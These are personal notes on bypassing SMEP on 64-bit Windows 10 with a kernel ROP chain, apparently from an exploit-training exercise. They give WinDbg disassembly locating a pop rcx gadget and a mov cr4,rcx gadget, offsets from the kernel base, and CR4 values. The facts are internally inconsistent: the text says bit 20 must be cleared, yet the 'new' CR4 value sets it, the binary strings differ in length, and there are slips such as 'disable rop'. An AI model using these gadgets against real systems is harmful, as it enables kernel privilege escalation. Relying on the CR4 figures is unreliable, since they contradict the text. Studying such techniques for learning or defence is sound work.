# Local SMEP bypass via Ropchain Windows10 64bit

> :warning: **This is just some notes for myself.**: Full credits and detailed explanation where i copied most of it comes from the following blog(s)
> https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/

We first need the kernel base adress. With WinDbg this can be achieved by looking for the `nt` loaded modules via `lm sm`. On my Microsoft Windows machine `Version 10.0.18362.30`) it looks like the following.

```C
0: kd> lmDvmnt
Browse full module list
start             end                 module name
fffff805`3c6b5000 fffff805`3d167000   nt         (pdb symbols)          c:\symbols\ntkrnlmp.pdb\35A038B1F6E2E8CAF642111E6EC66F571\ntkrnlmp.pdb
    Loaded symbol image file: ntkrnlmp.exe
    Image path: ntkrnlmp.exe
    Image name: ntkrnlmp.exe
    Browse all global symbols  functions  data
    Image was built with /Brepro flag.
    Timestamp:        E2F1A52B (This is a reproducible build file hash, not a timestamp)
    CheckSum:         00980B26
    ImageSize:        00AB2000
    Translations:     0000.04b0 0000.04e4 0409.04b0 0409.04e4
    Information from resource tables:
```

The cr4 register holds information about if smep is turned on or off in the 20th bit. Any kernel executable that has rop gadgets to flip this bit would now be suffienct to disable rop. Abachy found two short gadgets that let us pop a value into rcx and then move it into cr4 to effectively disable smep.


The pop rcx can be found here in `HvlEndSystemInterrupt`.


```C
0: kd> uf HvlEndSystemInterrupt
nt!HvlEndSystemInterrupt:
fffff805`3c86dc00 4851            push    rcx
fffff805`3c86dc02 50              push    rax
fffff805`3c86dc03 52              push    rdx
fffff805`3c86dc04 65488b142508620000 mov   rdx,qword ptr gs:[6208h]
fffff805`3c86dc0d b970000040      mov     ecx,40000070h
fffff805`3c86dc12 0fba3200        btr     dword ptr [rdx],0
fffff805`3c86dc16 7206            jb      nt!HvlEndSystemInterrupt+0x1e (fffff805`3c86dc1e)  Branch

nt!HvlEndSystemInterrupt+0x18:
fffff805`3c86dc18 33c0            xor     eax,eax
fffff805`3c86dc1a 8bd0            mov     edx,eax
fffff805`3c86dc1c 0f30            wrmsr

nt!HvlEndSystemInterrupt+0x1e:
fffff805`3c86dc1e 5a              pop     rdx
fffff805`3c86dc1f 58              pop     rax
fffff805`3c86dc20 59              pop     rcx # We are interested in a pop rcx
fffff805`3c86dc21 c3              ret
```

The next one that writes the value from rcx into crx can be found in `nt!KiEnableXSave`.


``` C
0: kd> uf nt!KiEnableXSave
nt!KiEnableXSave:
fffff805`3cc50190 0f20e1          mov     rcx,cr4
fffff805`3cc50193 48f7053242fdff00008000 test qword ptr [nt!KeFeatureBits (fffff805`3cc243d0)],800000h
fffff805`3cc5019e b800000400      mov     eax,40000h
fffff805`3cc501a3 0f842a5e0000    je      nt!KiEnableXSave+0x5e43 (fffff805`3cc55fd3)  Branch

nt!KiEnableXSave+0x19:
fffff805`3cc501a9 4885c8          test    rax,rcx
fffff805`3cc501ac 7453            je      nt!KiEnableXSave+0x71 (fffff805`3cc50201)  Branch

nt!KiEnableXSave+0x1e:
fffff805`3cc501ae 48bad803000080f7ffff mov rdx,0FFFFF780000003D8h
fffff805`3cc501b8 33c9            xor     ecx,ecx
fffff805`3cc501ba 488b12          mov     rdx,qword ptr [rdx]
fffff805`3cc501bd 488bc2          mov     rax,rdx
fffff805`3cc501c0 48c1ea20        shr     rdx,20h
fffff805`3cc501c4 0f01d1          xsetbv
fffff805`3cc501c7 48baf005000080f7ffff mov rdx,0FFFFF780000005F0h
fffff805`3cc501d1 488b12          mov     rdx,qword ptr [rdx]
fffff805`3cc501d4 4885d2          test    rdx,rdx
fffff805`3cc501d7 0f85e35d0000    jne     nt!KiEnableXSave+0x5e30 (fffff805`3cc55fc0)  Branch

nt!KiEnableXSave+0x4d:
fffff805`3cc501dd 65488b0c2520000000 mov   rcx,qword ptr gs:[20h]
fffff805`3cc501e6 488d81f0010000  lea     rax,[rcx+1F0h]
fffff805`3cc501ed 483981c0620000  cmp     qword ptr [rcx+62C0h],rax
fffff805`3cc501f4 740a            je      nt!KiEnableXSave+0x70 (fffff805`3cc50200)  Branch

nt!KiEnableXSave+0x66:
fffff805`3cc501f6 8189c862000040001000 or  dword ptr [rcx+62C8h],100040h

nt!KiEnableXSave+0x70:
fffff805`3cc50200 c3              ret  Branch

nt!KiEnableXSave+0x71:
fffff805`3cc50201 480bc8          or      rcx,rax
fffff805`3cc50204 0f22e1          mov     cr4,rcx
fffff805`3cc50207 eba5            jmp     nt!KiEnableXSave+0x1e (fffff805`3cc501ae)  Branch

nt!KiEnableXSave+0x5e30:
fffff805`3cc55fc0 488bc2          mov     rax,rdx
fffff805`3cc55fc3 b9a00d0000      mov     ecx,0DA0h
fffff805`3cc55fc8 48c1ea20        shr     rdx,20h
fffff805`3cc55fcc 0f30            wrmsr
fffff805`3cc55fce e90aa2ffff      jmp     nt!KiEnableXSave+0x4d (fffff805`3cc501dd)  Branch

nt!KiEnableXSave+0x5e43:
fffff805`3cc55fd3 4885c8          test    rax,rcx
fffff805`3cc55fd6 0f8424a2ffff    je      nt!KiEnableXSave+0x70 (fffff805`3cc50200)  Branch

nt!KiEnableXSave+0x5e4c:
fffff805`3cc55fdc 480fbaf112      btr     rcx,12h
fffff805`3cc55fe1 0f22e1          mov     cr4,rcx # We are interested in this gadget
fffff805`3cc55fe4 c3              ret
``` 


It's now time to calculate the offset for the different gadgets, so that they can be used at least with dynamical ntkernel base address.

Gadget 1 for pop rcx can be found at kernelbase + 0x001b8c20 . 
```C
0: kd> ? fffff8053c86dc20 - fffff8053c6b5000
Evaluate expression: 1805344 = 00000000`001b8c20
```

Gadget 2 for mov rc4,rcx can be found at kernelbase + 0x005a0fe1 .
```C
0: kd> ? fffff8053cc55fe1 - fffff8053c6b5000
Evaluate expression: 5902305 = 00000000`005a0fe1
```

Currently SMEP is enabled on my machine and cr4 holds the value:
```C
[+] CR4 hex: 0x00000000002506f8
[+] CR4 bin: 000000000000000000000000000000000000000001001010000011011111000
```

To disable SMEP cr4 the 20th bit in cr4 should be switched to 0, which corresponds to these new value:

```c
[+] CR4 hex: 0x00000000003506f8
[+] CR4 bin: 0000000000000000000000000000000000000000001101010000011011111000
```

